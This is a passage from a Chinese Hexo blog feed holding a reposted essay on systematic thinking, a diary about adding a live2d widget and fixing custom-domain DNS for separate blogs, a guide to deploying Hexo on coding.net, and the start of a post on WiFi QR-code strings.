title="C：你分析认为，张三是因为他二大爷的舅舅当了个芝麻官，所以他欺压老百姓，他之所以跟你作对，是嫉妒你比他帅……"></a>C：你分析认为，张三是因为他二大爷的舅舅当了个芝麻官，所以他欺压老百姓，他之所以跟你作对，是嫉妒你比他帅……</h2><p>你打算利用你的帅气，把张三的老婆加情人都勾引了，来报复他……</p><p>恭喜你，你的思维进入了中学阶段，<br>标志就是：你的视野开始拓宽，<br>你懂得要收集尽量多的信息，<br>用尽量客观的态度去分析你遇到的困难……<br>你开始尝试，并琢磨解决之道。</p><p>但是，由于既定思维的影响，<br>（比如，你无法丢弃“自己是正确”的立场）。<br>你以为你在客观地收集信息，<br>其实你有选择性的忽略对你不利的信息，<br>只选择对你有利的一面。<br>——这个过程是不自觉的，你自己不能区别。</p><p>所以，最后，<br>你的信息收集并不全面，<br>你对问题的分析偏颇的居多，<br>分析到位的时候很少。<br>你很容易把事情解决得南辕北辙。</p><h2 id="D：假如你这样分析遇到的困难："><a href="#D：假如你这样分析遇到的困难：" class="headerlink" title="D：假如你这样分析遇到的困难："></a>D：假如你这样分析遇到的困难：</h2><blockquote><p>常规困难还是特殊困难？<br>别人是否遇到过？<br>张三是故意刁难你，还是站在自己的立场上的正常行为？<br>如果你是张三，你会怎么做？<br>如何解决困难，有几条途径，<br>每条途径的优劣是什么？<br>从哪里入手？</p></blockquote><p>……<br>呵呵，恭喜你，<br>你进入了大学思维！ </p><h1 id="大学学习，最重要的课题是什么？"><a href="#大学学习，最重要的课题是什么？" class="headerlink" title="大学学习，最重要的课题是什么？"></a>大学学习，最重要的课题是什么？</h1><p>上大学，最最首要的课题是什么？<br>你到大学最该学什么？<br>记住这句话：</p><blockquote><p>将你的所有知识和思维“体系化”。<br>建立属于你自己的“体系化思维”。<br>或者叫系统思维。</p></blockquote><p>在此之前，<br>你所有的知识和技能，都处于碎片化状态，<br>你要通过大学，把它们整合起来，<br>变成一个体系，一个系统。<br>形成属于你自己的“浑然一体”的思维模型。</p><p>碎片化知识是没有力量的，<br>在社会上随便遇到一点困难，<br>就足以击垮你。<br>但是系统化知识及思维，会形成合力，<br>真正帮助你抵抗遇到的所有困难。</p><p>大学之所以成为我们人生的分水岭，<br>根源就在这里。<br>到了大学，<br>你才知道如何建立自己的体系化思维，<br>如何整合自己的所有知识和能力，<br>让他们形成合力。</p><blockquote><p>假如你没有学到这一点，<br>你的大学基本上白读了！</p></blockquote><p>我遇到过很多人，<br>知识很多，<br>多偏多怪的知识点，都知道，<br>但是真遇到问题，<br>他们所有的知识居然都失效了，<br>无法幻化成解决问题的能力。</p><blockquote><p>——这就是我们常说的高分低能现象。</p></blockquote><p>这个现象，<br>从思维角度看，<br>根源就是“体系化”思维没有建立，<br>知识在脑子里仅仅处于堆砌的、碎片化状态，<br>没有形成一个有效运转的系统。</p><p>我们以此来看下伍继红的栗子：<br>她第一份工作是3000元的教育工作，<br>但是她和同事有了矛盾，<br>于是辞职了。</p><p>如果伍继红拥有大学系统思维，<br>她应该这么想：和同事的矛盾是怎么造成的，<br>她的责任大还是我的责任大？<br>能不能调和？<br>假如不能调和，<br>我辞职是在惩罚她，还是惩罚我？</p><p>即使非要辞职，<br>那下一份工作在哪里？<br>找到了再辞如何？</p><blockquote><p>——这就是体系思维教会你的东西。</p></blockquote><p>但是，伍继红身上看不到这些，<br>她似乎是负气辞职——情绪思维。<br>她后来人生的所有选择，<br>几乎都出于本能</p><blockquote><p>——没看到她任何动脑子的一面。</p></blockquote><p>别说系统思维，<br>连简单的碎片化思维都看不见。<br>基本处于幼儿园思维阶段。</p><h1 id="系统思维的几个基本面"><a href="#系统思维的几个基本面" class="headerlink" title="系统思维的几个基本面"></a>系统思维的几个基本面</h1><p>每个人的思维模型是不一样的，<br>所以其建立的思维体系也不一样，</p><blockquote><p>千万不要以为有标准答案。</p></blockquote><p>假如要咬文嚼字，<br>也可以认为每个人都有自己的思维体系。<br>只不过，<br>有些人的体系是属于杂乱无章的、<br>受情绪控制的而已。</p><p>我们这里所说的体系和系统，<br>是指有章的。<br>即使有章，每个人还是不一样。<br>我们谈几个基本章法。</p><p>一个科学合理的思维体系，<br>应该至少包括如下几个方面：</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>目标永远是任何体系的中心。</p><p>我在大学，曾经和老师争论过这么一个话题：<br>如何确定我们人类发展的方向是正确的？</p><p>姐的问题大概是这样的：<br>在有上帝以前，人类的发展由上帝指引，<br>上帝作为人类的参照系，<br>指引着人类的进步。</p><blockquote><p>（特注：“进步”的概念来源于上帝，意思是离上帝又进了一步。）</p></blockquote><p>但是，<br>上帝后来被尼采搞死了。<br>上帝一死，尼采自己也发了疯。<br>这个疯子，搞得人类失去了参照系。<br>没法证明自己干的对不对了——<br>（在逻辑学和人类学上，自证是没有意义的。）</p><p>身在此山中，<br>人类是看不清楚自己问题的。<br>地球（迄今）又是孤独的，<br>没有其他高级生命的参照系。<br>那么，如何证明人类的发展没有走偏？<br>我们如何才能自己证明自己是正确的？</p><p>记得，<br>当时跟老师进行了很激烈的争论……</p><p>最后，老师的回答大概是这样的：<br>上帝死了，但是“进步”的概念照样存在，<br>人类的进步照样看得见。<br>最简单的判断是：<br>你今天的知识，超过古代了吗？<br>我们对这个世界，对宇宙的认知，<br>是不是在不断拓宽？<br>人类在是否在不断地探索，<br>是否在扩张自己的认知领域，<br>人类的活动空间、范围，是否远远超过了从前<br>——这就是“进步”。<br>只要人类在进步，<br>就说明，人类发展的方向基本没有错……</p><p>想起这个话题，<br>就是想说，</p><blockquote><p>教育和知识传承的社会学功能，<br>其实是帮助人类的“进步”。</p></blockquote><p>这就是为什么，我开篇会谈<br>教育要求每个人都要有向上的人生，<br>因为只有每个人都有向上的愿望，<br>社会整体才会指向进步的方向。</p><p>马克思之所以认为东方文明属于亚细亚模式，<br>就是他发现东方文明过早的进入一个死循环，<br>失去了“进步”的意义。<br>大家都喜欢玩“合久必分，分久必合”的转圈圈游戏。</p><blockquote><p>（当然，这是题外话，我们不展开。）</p></blockquote><p>对个人的来说，<br>如何向上（别理解为“向上爬”哈。）<br>需要让自身的目标，<br>和社会发展的目标方向大致一致；<br>假如不幸，你的目标，<br>正好完全等同于社会发展的目标了，<br>那姐恭喜你，你已经拥有了信仰。<br>——这就是为什么说，<br>共产主义是一种信仰。</p><p>当然，大部分情况下，<br>我们大多数人做不到如此伟岸。<br>个体的目标一般比较肤浅。<br>但是，再肤浅的目标也不能急功近利，<br>否则，你的体系就会因急功近利而坍塌。</p><p>举个栗子。<br>很多家长，把上大学当成目标灌输给孩子。<br>而这个目标，太急功近利，<br>也太容易达成。<br>所以孩子一到大学就失去目标和动力。<br>（目标都完成了，你还要人家干吗啊？）</p><p>本来大学只是起点，<br>因为家长的急功近利，变成了终点。<br>这样的孩子，别说在大学建立自己的体系化思维了，<br>他能把大学勉强混完，就不错了。</p><p>但是，这个不能怪孩子，<br>得怪家长。<br>你过早的把你的短浅的目标，塞给了孩子，<br>强迫他们接受。<br>当你的目标一实现时，</p><blockquote><p>孩子的目标也不见了——<br>他的内心就必然坍塌……</p></blockquote><p>如今有多少，<br>动不动就在闹自杀的孩子，<br>动不动就离家出走的孩子……<br>不知其父母是否反思过自己？</p><p>现在再回想一下，<br>从你一读书开始，老师就会念经一样的对你说：</p><blockquote><p>同学们，要有远大的理想……</p></blockquote><p>放进你的体系中细细回味下，<br>是否体会到教育真正的苦口婆心？</p><h2 id="工具和方法论层面"><a href="#工具和方法论层面" class="headerlink" title="工具和方法论层面"></a>工具和方法论层面</h2><p>限于篇幅，我们不展开了。</p><p>你从受教育开始，就在学习各种方法论和工具。<br>比如运算能力、综合能力，归纳能力，<br>分析分解能力，比较能力、抽象思维能力……</p><p>我个人而言，比较推崇逻辑能力。<br>我认为逻辑学不好，<br>其他工具都会运用不好。</p><blockquote><p>（ 要提示的是：逻辑是分层分级的，单一逻辑，基本上等于碎片化逻辑。）</p></blockquote><p>到大学，你所建立的体系，<br>需要把你所有的工具和能力纳入其中，<br>让它们浑然一体，形成你面对世界的利剑<br>——练出利剑的标志是：<br>你是否清楚地知道，<br>这些工具，什么时候该用？<br>用那些？怎么用？</p><h2 id="认知层面"><a href="#认知层面" class="headerlink" title="认知层面"></a>认知层面</h2><p>主要包括对社会和人的基本认知：<br>对社会，你要知道其运转的基本的规则，运行规律。<br>对人，要有起码的人性认知。</p><blockquote><p>知道人和人的差异，<br>其实就是思维背景和方式决定的。</p></blockquote><h2 id="视野和视角问题。我们谈两点："><a href="#视野和视角问题。我们谈两点：" class="headerlink" title="视野和视角问题。我们谈两点："></a>视野和视角问题。我们谈两点：</h2><p>其一，大学要有一个OPEN的视野。<br>所谓的“秀才不出门，能知天下事”，<br>你可以没去过别的地方，没去过国外，<br>但是你要对他们有基本的了解。<br>而不是只看到你自己眼睛所见的地方。</p><p>对国家来说，闭关锁国为什么吓人，<br>就是夜郎关起门来自嗨，以为自己过着全世界最幸福的日子。</p><blockquote><p>对个人来说，你的视野，决定你思维体系的边界，</p></blockquote><p>进而决定你人生的高度。<br>也就是说：你视野的范围就是你的人生范围。</p><p>所以，高晓松要说：<br>人生不止眼前的苟且，还有诗和远方。<br>谈的就是个视野问题。</p><blockquote><p>你看不到远方，<br>那就只能有眼前的无聊和琐碎了。</p></blockquote><p>其二，知道任何事物都有多个视角。<br>你了解的视角越多，你看的越清楚。<br>视角有个简单的分类，叫局部视角和全能视角。<br>很有意思的是：</p><blockquote><p>全能视角其实是孩子的视角，他认为他全知全能；<br>局部视角才是客观视角，因为只有上帝才全知全能。</p></blockquote><p>关于视角问题，曾经有个这样的实验。<br>给几个孩子放录像：<br>小朋友A拿着皮球进来，放在箱子里走了。<br>小朋友B进门，玩了下皮球，然后一脚，把皮球提到床下面了。<br>于是老师问孩子们：<br>请问小朋友，如果A进来，他会去哪里找皮球啊？</p><p>幼儿园的大部分孩子都会回答：他会去床脚下找，<br>因为他们“全能”地看见：皮球在床下面。<br>以为A也会知道，什么都看得见，</p><p>假如孩子回答：去箱子里找，他就学会了局部视角。<br>他开始知道，每个人都有他的局限性，<br>A把皮球放在了箱子里，<br>他不知道B做的事，<br>他只会根据他所掌握的的信息，做出判断——<br>认为皮球还在箱子里。</p><p>物理上有个很有意思的黑箱实验，<br>似乎叫薛定谔的猫。<br>就是告诉你，<br>在现实中，没有人拥有真正的全能视角，<br>所有的视角都是局部的。</p><blockquote><p>（你拥有的局部视角越多，越容易接近全貌。）</p></blockquote><p>很多人谈论热点新闻，<br>以为自己拥有的是全能视角，<br>其实只是你从报道中获得的“全能视角”<br>——报道者给你看到什么，就是什么。<br>他告诉你，薛定谔的猫是死的，<br>你就以为真死了……</p><blockquote><p>其实，薛定谔的猫生死未卜。</p></blockquote><p>只有一个人身处事件当中时，<br>才发现自己很多问题看不清楚，</p><blockquote><p>这就是当局者迷的原因，</p></blockquote><p>当局者本来就只有局部视角。</p><h2 id="理性"><a href="#理性" class="headerlink" title="理性"></a>理性</h2><p>理性最重要的是功能是排除情绪思维。<br>大多数情况下，情绪只会干扰你的判断。<br>对你解决问题几乎没有帮助，<br>甚至还有副作用。</p><p>比如，你看不惯别人，就想暴打人家一顿，<br>或者给人家一刀子，<br>下个毒什么的。<br>就属于情绪思维。</p><p>前几年复旦的投毒案件，<br>居然发生在研究生之间，<br>让姐真心木有想明白：<br>哇靠，这孩子咋读的大学啊？<br>……<br><br><br><br><br>从微信公众号<code>九维凤凰</code>转载，<a href="https://mp.weixin.qq.com/s/GS4AjRq-9eLk6SFwGIo-7w" target="_blank" rel="noopener">阅读原文</a><br><blockquote><p>我们无需你认同文章观点，但希望能打开你的智慧之门，让你的思考，从一维变成九维。</p><footer><strong>九维凤凰</strong></footer></blockquote><br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摘录 </tag>
            
            <tag> 三观 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记一次博客改动</title>
      <link href="/2018/08/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E6%94%B9%E5%8A%A8/"/>
      <url>/2018/08/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E6%94%B9%E5%8A%A8/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>今天搞博客搞了一个下午，遇到各种问题，痛并快乐着。。。</p></blockquote><a id="more"></a><h1 id="领养小姐姐"><a href="#领养小姐姐" class="headerlink" title="领养小姐姐"></a>领养小姐姐</h1><p>上午的时候领养了一个小姐姐，刚开始看人家的README一脸懵逼。好吧其实方法并不难，只是作者给了配置太多的信息，其实有部分可以放在Wiki里面。<br>Github地址：<a href="https://github.com/YuanLiChenAi/hexo-helper-live2d" target="_blank" rel="noopener">https://github.com/YuanLiChenAi/hexo-helper-live2d</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><p>安装模块：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在Hexo的 _config.yml 文件或主题的 _config.yml 文件中添加配置都可以，我这里添加在HEXO下的 _config.yml文件中.<br>示例配置:<br><figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  enable: <span class="built_in">true</span></span><br><span class="line">  scriptFrom: <span class="meta">local</span></span><br><span class="line">  pluginRootPath: live2dw/</span><br><span class="line">  pluginJsPath: lib/</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  tagMode: <span class="built_in">false</span></span><br><span class="line">  debug: <span class="built_in">false</span></span><br><span class="line">  model:</span><br><span class="line">    use: ./source/live2d_models/live2d-widget-model-koharu #模型位置及名称</span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: <span class="number">120</span></span><br><span class="line">    height: <span class="number">240</span></span><br><span class="line">  mobile:</span><br><span class="line">    show: <span class="built_in">true</span></span><br></pre></td></tr></table></figure></p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>我用的是koharu小姐姐，使用<code>npm install 模型的包名</code>来安装,然后将包名输入位于 _config.yml 的 model.use 中.<br>下载模型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install live2d-widget-model-koharu</span><br></pre></td></tr></table></figure></p><p>别的模型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">live2d-widget-model-chitose</span><br><span class="line">live2d-widget-model-epsilon2_1</span><br><span class="line">live2d-widget-model-gf</span><br><span class="line">live2d-widget-model-haru/01 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haru/02 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haruto</span><br><span class="line">live2d-widget-model-hibiki</span><br><span class="line">live2d-widget-model-hijiki</span><br><span class="line">live2d-widget-model-izumi</span><br><span class="line">live2d-widget-model-koharu</span><br><span class="line">live2d-widget-model-miku</span><br><span class="line">live2d-widget-model-ni-j</span><br><span class="line">live2d-widget-model-nico</span><br><span class="line">live2d-widget-model-nietzsche</span><br><span class="line">live2d-widget-model-nipsilon</span><br><span class="line">live2d-widget-model-nito</span><br><span class="line">live2d-widget-model-shizuku</span><br><span class="line">live2d-widget-model-tororo</span><br><span class="line">live2d-widget-model-tsumiki</span><br><span class="line">live2d-widget-model-unitychan</span><br><span class="line">live2d-widget-model-wanko</span><br><span class="line">live2d-widget-model-z16</span><br></pre></td></tr></table></figure></p><p>实物参考：<a href="https://huaji8.top/post/live2d-plugin-2.0/" target="_blank" rel="noopener">https://huaji8.top/post/live2d-plugin-2.0/</a><br><br></p><h1 id="独立的CTFwp"><a href="#独立的CTFwp" class="headerlink" title="独立的CTFwp"></a>独立的CTFwp</h1><p>一直觉得自己blog全是wp，不如直接建一个专用的ctfwp blog，于是下午就新建了一个ctf仓库，把所有wp文章都迁移出去。看了很多作者的主题，不是太复杂就是太简单，不符合我的需求，而且下过来也要改改风格，嫌麻烦就直接用现在的主题。除了字体等风格上的直接拷贝过来，评论系统、大部分page页等就复制了，以简单为主，当然小姐姐就不在这个库领养了。<br><br><br>在github创建ctf库时，库名是：<code>ctf.github.io</code>，page链接是<code>yuanlichenai.top/ctf.github.io</code>(yuanlichenai.top是我github的自定义域名)，一脸懵逼，然后我在阿里上添加了解析：<code>ctf.yuanlichenai.top</code>–指向–&gt;<code>yuanlichenai.top</code>,总觉得哪里不对呀。访问的时候没什么问题，但是在把站点升级为https的时候，颁发证书除了问题，不给我发证书，后来才知道原因是dns设置的问题。在排查问题时，我修改了库名为：<code>ctf</code>，page链接变成了<code>yuanlichenai.top/ctf</code>，想到某种可能，我把两个库的自定义域名都关闭了，此时旧库page页变成了<code>yuanlichenai.github.io</code>,ctf库变成了<code>yuanlichena.github.io/ctf</code>.似乎是找到了原因，我又修改了旧库的名字为：<code>yuanlichenai</code>，此时page页变成了<code>yuanlichenai.github.io/yuanlichenai</code>,瞬间恍然大悟。因为之前是看教程做的blog，所以有些地方是知其然而不知其所以然。<br><br><br>原因如下：<br>教程要求创建的库名是：<code>github用户名.github.io</code>,正常page链接应该是：<code>github用户名.github.io/github用户名.github.io</code>,因为一样就直接去重了，导致在ctf库里的page变成了<code>yuanlichenai.top/ctf.github.io</code>，解析记录只能写主机头+域名，<code>/</code>后面的东西是加不了的，github因为没有查到解析记录指向自己家的服务器，所以不能给我颁发证书。事实上不管什么源域名只要解析记录只要指向<code>github用户名.github.io</code>就可以了，github的服务器会通过源域名查询自己数据库记录的用户自定义域名来指向对应的githubku。顺带提一下当初教程说的解析是解析到github的ip地址，这样的方法肯定不如CNAME记录来的灵活，而且还是在阿里买的域名，然后去DNSPOD做解析。看了下这个DNSPOD好像和腾讯云有关系。。（看来作者的网络基础不过关啊。。）<br><br></p><h1 id="酷炫的导航页"><a href="#酷炫的导航页" class="headerlink" title="酷炫的导航页"></a>酷炫的导航页</h1><p>看了网友<a href="https://ourfor.top/" target="_blank" rel="noopener">ourfor</a>的blog，受到启发，既然都分成两个blog了不如直接弄一个导航页。原以为是什么高级的功能，原来是静态页，只不过修改了index索引文件，ourfor是在每次<code>hexo g</code>以后把public里的index.html重命名为home.html，同时再把index.html和welcome.html以及相关的样式文件在放进来，这样有点麻烦。于是我直接再创建一个导航库，将导航页放进去，样式文件在文件夹里，只能git上去，但是用git太麻烦，还需要配置一些东西。于是想到<code>hexo d</code>。先把<code>hexo g</code>生成的public文件夹里的东西删除，把导航页丢进去；再把_config.yml配置文件里的远程仓库地址改为导航库的git地址。一招偷梁换柱，完美✌。<br><br></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p><code>hexo clean</code>后可以直接<code>hexo d</code>，会自动帮你<code>hexo g</code>，但是没有clean就不行<br>自定义域名需要在DNS服务商配置的内容：<br>coding:<code>你自己的域名</code>–指向–&gt;<code>coding用户名.coding.me</code><br>github:<code>你自己的域名</code>–指向–&gt;<code>github用户名.github.io</code><br><br><br>现在的博客情况：<br>coding(为主)：<br>导航页：<a href="https://yuanlichenai.cn">https://yuanlichenai.cn</a><br>博客：<a href="https://blog.yuanlichenai.cn" target="_blank" rel="noopener">https://blog.yuanlichenai.cn</a><br>WP:<a href="https://ctf.yuanlichenai.cn" target="_blank" rel="noopener">https://ctf.yuanlichenai.cn</a><br><br><br>github：<br>导航页：<a href="https://yuanlichenai.top" target="_blank" rel="noopener">https://yuanlichenai.top</a><br>博客：<a href="https://blog.yuanlichenai.top" target="_blank" rel="noopener">https://blog.yuanlichenai.top</a><br>WP:<a href="https://ctf.yuanlichenai.top" target="_blank" rel="noopener">https://ctf.yuanlichenai.top</a><br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
            <tag> Coding </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记一次部署迁移</title>
      <link href="/2018/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%83%A8%E7%BD%B2%E8%BF%81%E7%A7%BB/"/>
      <url>/2018/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%83%A8%E7%BD%B2%E8%BF%81%E7%A7%BB/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>大佬推荐把博客部署在coding上，毕竟github在国外访问比较慢</p></blockquote><a id="more"></a><p>参考<a href="http://blog.lujingtao.com/2017/11/19/hexo-deploy/" target="_blank" rel="noopener">玩转hexo-3-部署</a></p><h1 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h1><h2 id="注册并新建项目"><a href="#注册并新建项目" class="headerlink" title="注册并新建项目"></a>注册并新建项目</h2><p>官网链接：<a href="https://coding.net/" target="_blank" rel="noopener">coding</a><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-coding/2018-07-06-14-26-07.png" alt="新建项目" title="" class="">                <p>新建项目</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-coding/2018-07-06-14-28-08.png" alt="基本配置" title="" class="">                <p>基本配置</p>            </figure></p><h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-coding/2018-07-06-14-35-16.png" alt="选择分支" title="" class="">                <p>选择分支</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-coding/2018-07-06-14-36-59.png" alt="新建分支" title="" class="">                <p>新建分支</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-coding/2018-07-06-14-38-06.png" alt="创建分支" title="" class="">                <p>创建分支</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-coding/2018-07-06-14-41-02.png" alt="修改默认分支" title="" class="">                <p>修改默认分支</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-coding/2018-07-06-14-41-26.png" alt="选择新建的分支" title="" class="">                <p>选择新建的分支</p>            </figure><h2 id="启动page服务"><a href="#启动page服务" class="headerlink" title="启动page服务"></a>启动page服务</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-coding/2018-07-06-14-43-34.png" alt="选择page服务" title="" class="">                <p>选择page服务</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-coding/2018-07-06-14-45-24.png" alt="选择master分支" title="" class="">                <p>选择master分支</p>            </figure><p><br></p><h1 id="通过git完成部署"><a href="#通过git完成部署" class="headerlink" title="通过git完成部署"></a>通过git完成部署</h1><h2 id="修改部署路径"><a href="#修改部署路径" class="headerlink" title="修改部署路径"></a>修改部署路径</h2><p>将之前的github注释掉，添加coding的deploy<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/deployment.html</span><br><span class="line">#deploy:</span><br><span class="line">  #type: git</span><br><span class="line">  #repository: git@github.com:YuanLiChenAi/YuanLiChenAi.github.io.git</span><br><span class="line">  #branch: master</span><br><span class="line">deploy:</span><br><span class="line">  - type: git</span><br><span class="line">    repo: git@git.coding.net:YuanLiChenAi/YuanLiChenAi.git # 后面为:你的账号/刚才创建的仓库名.git</span><br><span class="line">    branch: master</span><br><span class="line">  - type: git</span><br><span class="line">    repo: git@git.coding.net:YuanLiChenAi/YuanLiChenAi.git # 后面为:你的账号/刚才创建的仓库名.git</span><br><span class="line">    branch: src</span><br><span class="line">    extend_dirs: /</span><br><span class="line">    ignore_hidden: false</span><br><span class="line">    ignore_pattern:</span><br><span class="line">        public: .</span><br><span class="line">        .git: .</span><br></pre></td></tr></table></figure></p><p>coding有两个分支，master用来部署网站，src用来备份网站源文件<br>效果如下：<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-coding/2018-07-06-14-55-55.png" alt="master保存静态html" title="" class="">                <p>master保存静态html</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-coding/2018-07-06-14-56-36.png" alt="src分支保存源文件" title="" class="">                <p>src分支保存源文件</p>            </figure><br><br><br><blockquote><p>因为我是从github切换到coding的，所以目录下中含有<code>.git</code>隐藏目录<br>如果直接部署，则会报错。所以要在博客目录中用<code>rm -rf .git</code>命令来删除这个目录<br>删除之后就可以顺利部署了，而且不用再用<code>git push ...</code>备份了</p><footer><strong>特别注意</strong></footer></blockquote></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> coding </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>手机扫码连接wifi</title>
      <link href="/2018/07/03/%E6%89%8B%E6%9C%BA%E6%89%AB%E7%A0%81%E8%BF%9E%E6%8E%A5wifi/"/>
      <url>/2018/07/03/%E6%89%8B%E6%9C%BA%E6%89%AB%E7%A0%81%E8%BF%9E%E6%8E%A5wifi/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>发现有微信扫码连接Wifi这种操作，于是折腾一下二维码</p></blockquote><a id="more"></a><h1 id="微信扫一扫"><a href="#微信扫一扫" class="headerlink" title="微信扫一扫"></a>微信扫一扫</h1><p>用二维码解码工具看看内容是什么↓<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Wifi-QRcode/2018-07-03-11-24-03.png" alt="" title="" class="">                <p></p>            </figure><br>可以看出是一个网址链接，用浏览器打开<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Wifi-QRcode/2018-07-03-11-28-45.png" alt="" title="" class="">                <p></p>            </figure><br>提示需要用微信打开，微信扫码可以连接wifi<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Wifi-QRcode/2018-07-03-11-33-23.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Wifi-QRcode/2018-07-03-11-33-32.png" alt="" title="" class="">                <p></p>            </figure><br>然后去安利了一波方法(百度就有)：<a href="https://jingyan.baidu.com/article/3a2f7c2edc3e1026afd61197.html" target="_blank" rel="noopener">微信连wif申请、配置、使用全版教程</a></p><p><br></p><h1 id="手机相机扫一扫"><a href="#手机相机扫一扫" class="headerlink" title="手机相机扫一扫"></a>手机相机扫一扫</h1><p>参考： <a href="https://www.chenyudong.com/archives/wifi-qrcode-in-home-android-and-ios.html" target="_blank" rel="noopener">Android、IOS手机扫描家庭二维码连接WiFi</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WIFI:T:WPA/WPA2;S:wifiname;P:wifipasswd;;</span><br></pre></td></tr></table></figure></p><p>说明：<br><code>WIFI</code>表示这个是一个连接WiFi的协议<br><code>S</code>表示后面是WiFi的 SSID，<code>wifiname</code>也就是 WiFi 的名称<br><code>P</code>表示后面是WiFi的密码，<code>wifipasswd</code>是 WiFi 的密码<br><code>T</code>表示后面是密码的加密方式，<code>WPA/WPA2</code>大部分都是这个加密方式，也有的路由器是使用<code>WPA</code>。<br><code>H</code>表示这个WiFi是否是隐藏的，直接打开 WiFi 扫不到这个信号。苹果还不支持隐藏模式</p><p>然后将这段文字生成二维码即可，在线二维码生成地址：<a href="http://tool.oschina.net/qr" target="_blank" rel="noopener">在线生成二维码(QR码)</a></p><h2 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h2><figure class="image-box">                <img 